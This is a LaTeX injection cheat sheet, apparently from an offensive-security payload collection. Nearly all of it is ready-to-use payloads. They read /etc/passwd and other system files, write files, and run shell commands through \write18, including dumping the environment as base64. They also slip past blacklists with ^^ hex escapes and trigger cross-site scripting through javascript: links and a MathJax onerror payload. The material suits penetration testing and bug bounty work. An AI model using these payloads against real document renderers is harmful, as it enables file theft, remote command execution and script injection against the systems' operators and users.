# LaTex Injection

You might need to adjust injection with wrappers as `\[` or `$`.

## Read file

Read file and interpret the LaTeX code in it:

```tex
\input{/etc/passwd}
\include{somefile} # load .tex file (somefile.tex)
```

Read single lined file:

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

Read multiple lined file:

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

Read text file, **without** interpreting the content, it will only paste raw file content:

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

If injection point is past document header (`\usepackage` cannot be used), some control 
characters can be deactivated in order to use `\input` on file containing `$`, `#`, 
`_`, `&`, null bytes, ... (eg. perl scripts).

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

To bypass a blacklist try to replace one character with it's unicode hex value. 
- ^^41 represents a capital A
- ^^7e represents a tilde (~) note that the ‘e’ must be lower case

```tex
\lstin^^70utlisting{/etc/passwd}
```

## Write file

Write single lined file:

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## Command execution

The output of the command will be redirected to stdout, therefore you need to use a temp file to get it.

```tex
\immediate\write18{id > output}
\input{output}
```

If you get any LaTex error, consider using base64 to get the result without bad characters (or use `\verbatiminput`):

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

## Cross Site Scripting

From [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) 

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

in [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```


## References

* [Hacking with LaTeX - Sebastian Neef - 0day.work](https://0day.work/hacking-with-latex/)
* [Latex to RCE, Private Bug Bounty Program - Yasho](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
* [Pwning coworkers thanks to LaTeX](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)
